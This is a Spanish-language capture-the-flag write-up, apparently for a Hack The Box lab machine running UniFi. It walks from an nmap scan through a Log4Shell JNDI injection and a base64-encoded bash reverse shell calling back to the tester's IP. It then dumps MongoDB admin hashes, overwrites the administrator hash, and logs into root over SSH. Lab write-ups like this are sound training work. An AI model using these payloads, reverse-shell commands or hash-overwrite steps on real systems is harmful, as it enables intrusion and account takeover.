@@ -1,0 +1,801 @@
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-10 21:54 -0600
+Nmap scan report for 10.129.96.149
+Host is up (0.081s latency).
+Not shown: 65529 closed tcp ports (conn-refused)
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+6789/tcp open  ibm-db2-admin?
+8080/tcp open  http            Apache Tomcat (language: en)
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Did not follow redirect to https://10.129.96.149:8443/manage
+8443/tcp open  ssl/nagios-nsca Nagios NSCA
+| http-title: UniFi Network
+|_Requested resource was /manage/account/login?redirect=%2Fmanage
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
+| Subject Alternative Name: DNS:UniFi
+| Not valid before: 2021-12-30T21:37:24
+|_Not valid after:  2024-04-03T21:37:24
+8843/tcp open  ssl/http        Apache Tomcat (language: en)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
+| Subject Alternative Name: DNS:UniFi
+| Not valid before: 2021-12-30T21:37:24
+|_Not valid after:  2024-04-03T21:37:24
+|_http-title: HTTP Status 400 \xE2\x80\x93 Bad Request
+8880/tcp open  http            Apache Tomcat (language: en)
+|_http-title: HTTP Status 400 \xE2\x80\x93 Bad Request
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+en la fase de reconocimiento, se encuentra esto, como es ssl, secure socket layer, en vez de http se usa https, mas el puerto 8443
+una vez hecho esto, 
+
+vemos un login, y buscamos vulnerabilidades para ella, en este caso el CVE-2021-44228
+
+
+
+Funcionamiento de Log4Shell
+
+Log4Shell es una vulnerabilidad por inyección de Java Naming and Directory Interface™ (JNDI), la cual permite la ejecución remota de código (RCE). Al incluir datos que no son de confianza (como rutinas maliciosas) en el mensaje registrado de una versión afectada de Apache Log4j, un atacante puede establecer una conexión a un servidor malicioso mediante una búsqueda de JNDI. El resultado: acceso completo a su sistema desde cualquier lugar del mundo.
+
+Dado que la búsqueda de JNDI admite distintos tipos de directorios, como el servicio de nombres de dominio (DNS), el protocolo ligero de acceso a directorios (LDAP), el cual proporciona información valiosa como los dispositivos de red de la organización, la invocación del método remoto (RMI) y el protocolo inter-ORB (IIOP), Log4Shell puede llevar a otras amenazas como:
+
+    Coinmining (minería de monedas): los atacantes pueden utilizar sus recursos para extraer criptomonedas. Esta amenaza puede ser muy costosa, debido a la enorme cantidad de potencia de procesamiento requerido para ejecutar servicios y aplicaciones en la nube.
+    Denegación de servicio (DoS) de red: esta amenaza permite que los atacantes desconecten y/o deshabiliten una red, sitio web o servicio para que la organización atacada no pueda acceder a ellos.
+    Ransomware: tras lograr el RCE, los atacantes pueden recopilar y cifrar datos con el fin de pedir posteriormente un rescate por ellos.
+
+
+Se inicia burpsuite con un dicho proxy 
+
+hacemos un 
+
+{target-ip}/api/login
+
+y con ctrl + r 
+
+lo mandamos a repeater, despues nos regresamos a la pagina de login, para despues recibir el POST con cualquier usuario y contraseña 
+
+y haciendo en el repeater un cambio a remember con 
+
+"${jndi:ldap://10.10.14.141/attacker.com}",
+
+mientras que en nuestra consola un 
+
+sudo tcpdump -i tun0 port 389
+
+lo mandamos y si todo sale bien sale un 
+
+  nitblan   ~/HTB/Unified  sudo tcpdump -i tun0 port 389
+Deploying root access for nitblan. Password pls: 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+23:05:19.269035 IP 10.129.96.149.32838 > Nitblan.ldap: Flags [S], seq 2171854447, win 64240, options [mss 1362,sackOK,TS val 3482045715 ecr 0,nop,wscale 7], length 0
+23:05:19.269063 IP Nitblan.ldap > 10.129.96.149.32838: Flags [R.], seq 0, ack 2171854448, win 0, length 0
+
+lo que quiere decir que interceptamos el protocolo LDAP
+
+
+
+
+sudo apt install openjdk-11-jdk -y
+
+sudo apt-get install maven -y
+
+git clone https://github.com/veracode-research/rogue-jndi
+
+Go to this folder /unify/rogue-jndi and run this command:
+
+mvn package
+
+
+o en mi caso como uso arch 
+
+
+
+sudo pacman -S jdk11-openjdk
+
+sudo pacman -S maven
+
+git clone https://github.com/veracode-research/rogue-jndi
+cd rogue-jndi
+mvn package
+
+y nos metemos a rogue
+
+despues hasheamos en base64 una bash 
+
+
+echo ‘bash -c bash -i >&/dev/tcp/10.10.14.141/4444 0>&1’ | base64
+
+YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTQxOjQ0NDQgMD4mMQo=
+
+si no funcionan las '' usen ""
+
+
+y despues simplemente ponemos la conexión con 
+
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTQxLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.141"
+
+y despues nos vamos a burpsuite una vez aparezca tomcat y en remember reemplazamos por la linea
+
+"remember":"${jndi:ldap://10.10.14.141:1389/o=tomcat}",
+
+nos ponemos en escucha antes con nc por el puerto 4444
+
+y obtenemos una shell como unify
+
+toca upgradear la shell, para eso pegamos 
+
+script /dev/null -c bash
+
+hacemos un cd a /home/michael
+
+y primera Flags
+
+6ced1a6a89e666c0620cdb10262ba127
+
+
+toca escalar privilegios
+
+
+hacemos un ps aux grepeando a mongo
+
+ps aux | grep mongo
+unifi         67  0.3  4.1 1101696 85200 ?       Sl   04:44   0:25 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
+unifi       3115  0.0  0.0  11468   984 pts/0    S+   06:35   0:00 grep mongo
+unifi@unified:/home/michael$
+
+vemos que se esta ejecutandp en el puerto 27117
+
+y sencillamente nos conectamos a mongo
+
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+
+
+
+y bingo 
+
+
+connecting to: mongodb://127.0.0.1:27117/ace
+MongoDB server version: 3.6.3
+{
+	"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+	"name" : "administrator",
+	"email" : "administrator@unified.htb",
+	"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+	"time_created" : NumberLong(1640900495),
+	"last_site_name" : "default",
+	"ui_settings" : {
+		"neverCheckForUpdate" : true,
+		"statisticsPrefferedTZ" : "SITE",
+		"statisticsPreferBps" : "",
+		"tables" : {
+			"device" : {
+				"sortBy" : "type",
+				"isAscending" : true,
+				"initialColumns" : [
+					"type",
+					"deviceName",
+					"status",
+					"connection",
+					"network",
+					"ipAddress",
+					"experience",
+					"firmwareStatus",
+					"downlink",
+					"uplink",
+					"dailyUsage"
+				],
+				"columns" : [
+					"type",
+					"deviceName",
+					"status",
+					"macAddress",
+					"model",
+					"ipAddress",
+					"connection",
+					"network",
+					"experience",
+					"firmwareStatus",
+					"firmwareVersion",
+					"memoryUsage",
+					"cpuUsage",
+					"loadAverage",
+					"utilization",
+					"clients",
+					"lastSeen",
+					"downlink",
+					"uplink",
+					"dailyUsage",
+					"uptime",
+					"wlan2g",
+					"wlan5g",
+					"radio2g",
+					"radio5g",
+					"clients2g",
+					"clients5g",
+					"bssid",
+					"tx",
+					"rx",
+					"tx2g",
+					"tx5g",
+					"channel",
+					"channel2g",
+					"channel5g"
+				]
+			},
+			"client" : {
+				"sortBy" : "physicalName",
+				"isAscending" : true,
+				"initialColumns" : [
+					"status",
+					"clientName",
+					"physicalName",
+					"connection",
+					"ip",
+					"experience",
+					"Downlink",
+					"Uplink",
+					"dailyUsage"
+				],
+				"columns" : [
+					"status",
+					"clientName",
+					"mac",
+					"physicalName",
+					"connection",
+					"network",
+					"interface",
+					"wifi_band",
+					"ip",
+					"experience",
+					"Downlink",
+					"Uplink",
+					"dailyUsage",
+					"uptime",
+					"channel",
+					"Uplink_apPort",
+					"signal",
+					"txRate",
+					"rxRate",
+					"first_seen",
+					"last_seen",
+					"rx_packets",
+					"tx_packets"
+				],
+				"filters" : {
+					"status" : {
+						"active" : true
+					},
+					"connection_type" : {
+						"ng" : true,
+						"na" : true,
+						"wired" : true,
+						"vpn" : true
+					},
+					"clients_type" : {
+						"users" : true,
+						"guests" : true
+					},
+					"device" : {
+						"device" : ""
+					}
+				}
+			},
+			"unifiDevice" : {
+				"sortBy" : "type",
+				"isAscending" : true,
+				"columns" : [
+					"type",
+					"name",
+					"status",
+					"macAddress",
+					"model",
+					"ipAddress",
+					"connection",
+					"network",
+					"experience",
+					"firmwareStatus",
+					"firmwareVersion",
+					"memoryUsage",
+					"cpuUsage",
+					"loadAverage",
+					"utilization",
+					"clients",
+					"dailyUsage",
+					"lastSeen",
+					"downlink",
+					"uplink",
+					"uptime",
+					"wlan2g",
+					"wlan5g",
+					"radio2g",
+					"radio5g",
+					"clients2g",
+					"clients5g",
+					"bssid",
+					"tx",
+					"rx",
+					"tx2g",
+					"tx5g",
+					"channel",
+					"channel2g",
+					"channel5g"
+				],
+				"initialColumns" : [
+					"type",
+					"name",
+					"status",
+					"connection",
+					"network",
+					"ipAddress",
+					"experience",
+					"firmwareStatus",
+					"downlink",
+					"uplink",
+					"dailyUsage"
+				]
+			},
+			"unifiDeviceNetwork" : {
+				"sortBy" : "type",
+				"isAscending" : true,
+				"columns" : [
+					"type",
+					"name",
+					"status",
+					"macAddress",
+					"model",
+					"ipAddress",
+					"connection",
+					"network",
+					"experience",
+					"firmwareStatus",
+					"firmwareVersion",
+					"memoryUsage",
+					"cpuUsage",
+					"loadAverage",
+					"utilization",
+					"clients",
+					"dailyUsage",
+					"lastSeen",
+					"downlink",
+					"uplink",
+					"uptime",
+					"wlan2g",
+					"wlan5g",
+					"radio2g",
+					"radio5g",
+					"clients2g",
+					"clients5g",
+					"bssid",
+					"tx",
+					"rx",
+					"tx2g",
+					"tx5g",
+					"channel",
+					"channel2g",
+					"channel5g"
+				],
+				"initialColumns" : [
+					"type",
+					"name",
+					"status",
+					"connection",
+					"network",
+					"ipAddress",
+					"experience",
+					"firmwareStatus",
+					"downlink",
+					"uplink",
+					"dailyUsage"
+				]
+			},
+			"unifiDeviceAccess" : {
+				"sortBy" : "type",
+				"isAscending" : true,
+				"columns" : [
+					"type",
+					"name",
+					"status",
+					"macAddress",
+					"model",
+					"ipAddress",
+					"connection",
+					"network",
+					"experience",
+					"firmwareStatus",
+					"firmwareVersion",
+					"memoryUsage",
+					"cpuUsage",
+					"loadAverage",
+					"utilization",
+					"clients",
+					"dailyUsage",
+					"lastSeen",
+					"downlink",
+					"uplink",
+					"uptime",
+					"wlan2g",
+					"wlan5g",
+					"radio2g",
+					"radio5g",
+					"clients2g",
+					"clients5g",
+					"bssid",
+					"tx",
+					"rx",
+					"tx2g",
+					"tx5g",
+					"channel",
+					"channel2g",
+					"channel5g"
+				],
+				"initialColumns" : [
+					"type",
+					"name",
+					"status",
+					"connection",
+					"network",
+					"ipAddress",
+					"experience",
+					"firmwareStatus",
+					"downlink",
+					"uplink",
+					"dailyUsage"
+				]
+			},
+			"unifiDeviceProtect" : {
+				"sortBy" : "type",
+				"isAscending" : true,
+				"columns" : [
+					"type",
+					"name",
+					"status",
+					"macAddress",
+					"model",
+					"ipAddress",
+					"connection",
+					"network",
+					"experience",
+					"firmwareStatus",
+					"firmwareVersion",
+					"memoryUsage",
+					"cpuUsage",
+					"loadAverage",
+					"utilization",
+					"clients",
+					"dailyUsage",
+					"lastSeen",
+					"downlink",
+					"uplink",
+					"uptime",
+					"wlan2g",
+					"wlan5g",
+					"radio2g",
+					"radio5g",
+					"clients2g",
+					"clients5g",
+					"bssid",
+					"tx",
+					"rx",
+					"tx2g",
+					"tx5g",
+					"channel",
+					"channel2g",
+					"channel5g"
+				],
+				"initialColumns" : [
+					"type",
+					"name",
+					"status",
+					"connection",
+					"network",
+					"ipAddress",
+					"experience",
+					"firmwareStatus",
+					"downlink",
+					"uplink",
+					"dailyUsage"
+				]
+			},
+			"unifiDeviceTalk" : {
+				"sortBy" : "type",
+				"isAscending" : true,
+				"columns" : [
+					"type",
+					"name",
+					"status",
+					"macAddress",
+					"model",
+					"ipAddress",
+					"connection",
+					"network",
+					"experience",
+					"firmwareStatus",
+					"firmwareVersion",
+					"memoryUsage",
+					"cpuUsage",
+					"loadAverage",
+					"utilization",
+					"clients",
+					"dailyUsage",
+					"lastSeen",
+					"downlink",
+					"uplink",
+					"uptime",
+					"wlan2g",
+					"wlan5g",
+					"radio2g",
+					"radio5g",
+					"clients2g",
+					"clients5g",
+					"bssid",
+					"tx",
+					"rx",
+					"tx2g",
+					"tx5g",
+					"channel",
+					"channel2g",
+					"channel5g"
+				],
+				"initialColumns" : [
+					"type",
+					"name",
+					"status",
+					"connection",
+					"network",
+					"ipAddress",
+					"experience",
+					"firmwareStatus",
+					"downlink",
+					"uplink",
+					"dailyUsage"
+				]
+			},
+			"insights/wifiScanner" : {
+				"sortBy" : "apCount",
+				"isAscending" : false,
+				"initialColumns" : [
+					"apCount",
+					"essid",
+					"bssid",
+					"security",
+					"radio",
+					"signal",
+					"channel",
+					"band",
+					"bw",
+					"oui",
+					"date",
+					"ap_mac"
+				],
+				"columns" : [
+					"apCount",
+					"essid",
+					"bssid",
+					"security",
+					"radio",
+					"signal",
+					"channel",
+					"band",
+					"bw",
+					"oui",
+					"date",
+					"ap_mac"
+				]
+			},
+			"insights/wifiMan" : {
+				"sortBy" : "date",
+				"isAscending" : false,
+				"initialColumns" : [
+					"clinet_name",
+					"client_wifi_experience",
+					"device_model",
+					"device_name",
+					"wlan_essid",
+					"client_signal",
+					"wlan_channel_width",
+					"down",
+					"up",
+					"endPoint",
+					"rate",
+					"date"
+				],
+				"columns" : [
+					"clinet_name",
+					"client_wifi_experience",
+					"device_model",
+					"device_name",
+					"wlan_essid",
+					"client_signal",
+					"wlan_channel_width",
+					"down",
+					"up",
+					"endPoint",
+					"rate",
+					"date"
+				]
+			}
+		},
+		"topologyViewSettings" : {
+			"showAllDevices" : true,
+			"showAllClients" : true,
+			"show2GClients" : true,
+			"show5GClients" : true,
+			"showWiredClients" : true,
+			"showSSID" : false,
+			"showWifiExperience" : true,
+			"showRadioChannel" : false,
+			"showWifiStandards" : false,
+			"showWiredSpeed" : false,
+			"showWiredPorts" : false,
+			"online" : true,
+			"offline" : true,
+			"isolated" : true,
+			"pending_adoption" : true,
+			"managed_by_another_console" : true
+		},
+		"preferences" : {
+			"alertsPosition" : "top_right",
+			"allowHiddenDashboardModules" : false,
+			"browserLogLevel" : "INFO",
+			"bypassAutoFindDevices" : false,
+			"bypassConfirmAdoptAndUpgrade" : false,
+			"bypassConfirmBlock" : false,
+			"bypassConfirmRestart" : false,
+			"bypassConfirmUpgrade" : false,
+			"bypassHybridDashboardNotice" : false,
+			"bypassDashboardUdmProAd" : false,
+			"bypassHybridSettingsNotice" : false,
+			"dateFormat" : "MMM DD YYYY",
+			"dismissWlanOverrides" : false,
+			"enableNewUI" : false,
+			"hideV3SettingsIntro" : true,
+			"isAppDark" : true,
+			"isPropertyPanelFixed" : true,
+			"isRegularGraphForAirViewEnabled" : false,
+			"isResponsive" : false,
+			"isSettingsDark" : true,
+			"isUndockedByDefault" : false,
+			"noWhatsNew" : false,
+			"propertyPanelCollapse" : false,
+			"propertyPanelMultiMode" : true,
+			"refreshButtonEnabled" : false,
+			"refreshRate" : "2MIN",
+			"refreshRateRememberAll" : false,
+			"rowsPerPage" : 50,
+			"showAllPanelActions" : false,
+			"showWifimanAppsBanner" : true,
+			"timeFormat" : "H:mm",
+			"use24HourTime" : true,
+			"useBrowserTheme" : false,
+			"useSettingsPanelView" : false,
+			"websocketEnabled" : true,
+			"withStickyTableActions" : true,
+			"isUlteModalClosed" : false,
+			"isUbbAlignmentToolModalClosed" : false,
+			"offlineClientTimeframe" : 24
+		},
+		"preferredLanguage" : "en",
+		"dashboardConfig" : {
+			"lastActiveDashboardId" : "61ce269d46e0fb0012d47ec6"
+		}
+	},
+	"requires_new_password" : false,
+	"email_alert_enabled" : true,
+	"email_alert_grouping_enabled" : true,
+	"html_email_enabled" : true,
+	"is_professional_installer" : false,
+	"push_alert_enabled" : true
+}
+{
+	"_id" : ObjectId("61ce4a63fbce5e00116f424f"),
+	"email" : "michael@unified.htb",
+	"name" : "michael",
+	"x_shadow" : "$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0",
+	"requires_new_password" : false,
+	"time_created" : NumberLong(1640909411),
+	"last_site_name" : "default",
+	"email_alert_enabled" : false,
+	"email_alert_grouping_enabled" : false,
+	"email_alert_grouping_delay" : 60,
+	"push_alert_enabled" : false
+}
+{
+	"_id" : ObjectId("61ce4ce8fbce5e00116f4251"),
+	"email" : "seamus@unified.htb",
+	"name" : "Seamus",
+	"x_shadow" : "$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.",
+	"requires_new_password" : true,
+	"time_created" : NumberLong(1640910056),
+	"last_site_name" : "default"
+}
+{
+	"_id" : ObjectId("61ce4d27fbce5e00116f4252"),
+	"email" : "warren@unified.htb",
+	"name" : "warren",
+	"x_shadow" : "$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.",
+	"requires_new_password" : true,
+	"time_created" : NumberLong(1640910119),
+	"last_site_name" : "default"
+}
+{
+	"_id" : ObjectId("61ce4d51fbce5e00116f4253"),
+	"email" : "james@unfiied.htb",
+	"name" : "james",
+	"x_shadow" : "$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1",
+	"requires_new_password" : false,
+	"time_created" : NumberLong(1640910161),
+	"last_site_name" : "default"
+}
+unifi@unified:/home/michael$
+
+
+
+con eso encontramos hashes del buen admin, y como esta ssh abierto ggs
+
+en vez de crackearlo, ponemos un hash con una contraseña sencillisima
+
+mkpasswd -m sha-512 Password1234
+
+nos aseguramos que lo maten al tener la contraseña asi 
+
+$6$Ihhippe3E6d8j.L9$W8J8SkfeEzKdQXCeB1VZ3D59vQ1YdQP2gsS0qX.YI4txlQMixZa2yUW7FdduhHTVoYyJRajJ.Gw9AJ3KIJC5S/
+
+mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$Ihhippe3E6d8j.L9$W8J8SkfeEzKdQXCeB1VZ3D59vQ1YdQP2gsS0qX.YI4txlQMixZa2yUW7FdduhHTVoYyJRajJ.Gw9AJ3KIJC5S/"}})'
+
+y nos sale 
+
+
+unifi@unified:/home/michael$ mongo --port 27117 ace --eval 'db.admin.update({"_id": ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$Ihhippe3E6d8j.L9$W8J8SkfeEzKdQXCeB1VZ3D59vQ1YdQP2gsS0qX.YI4txlQMixZa2yUW7FdduhHTVoYyJRajJ.Gw9AJ3KIJC5S/"}})'
+KIJC5S/"}})'dQXCeB1VZ3D59vQ1YdQP2gsS0qX.YI4txlQMixZa2yUW7FdduhHTVoYyJRajJ.Gw9AJ3K
+MongoDB shell version v3.6.3
+connecting to: mongodb://127.0.0.1:27117/ace
+MongoDB server version: 3.6.3
+WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
+unifi@unified:/home/michael$ 
+
+y esto es para reemplazar el hash de la contraseña que tenia admin
+
+y simplemente nos logeamos como administrator y password1234 y gg al unify 
+
+explorando el sitio nos encontramos con que en el site esta la contraseña de root 
+
+root 
+NotACrackablePassword4U2022
+
+y gg al ssh 
+
+
+
+ssh root@10.129.96.149
+
+
+
+ponemos la contraseña y gg 
+
+cat /root/root.txt 
+
+y flag de root
+
+
+root@unified:~# whoami
+root
+root@unified:~# cat /root/root.txt
+e50bc93c75b634e4b272d2f771c33681
+root@unified:~# 
+
+
+e50bc93c75b634e4b272d2f771c33681
+
+Hoy para mi no fue un buen día, que tal el tuyo?
+extraño a alguien que no deberia, la vi....
+y aqui estamos, unos simples mortales intentando ser hackers, solo la terminal y tu 
+persona que me estas leyendo, hola :) espero logres tus objetivos 
+
+PWNED :)
+
